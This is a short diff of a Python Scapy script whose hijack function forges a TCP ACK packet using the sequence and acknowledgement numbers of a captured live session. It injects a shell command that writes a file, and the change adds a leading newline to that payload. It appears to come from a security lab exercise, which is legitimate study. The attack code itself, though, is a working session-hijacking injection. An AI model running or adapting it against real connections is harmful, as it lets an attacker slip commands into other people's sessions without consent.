@@ -7,7 +7,7 @@ def hijack(pkt):
     ip.dst = pkt[IP].dst
     ip.src = pkt[IP].src
     tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
-    data=' "echo Something evil..." > malicious.txt\n '
+    data=' \n"echo Something evil..." > malicious.txt\n '
     send(ip/tcp/data, verbose=0)
 
 # Returns network interface
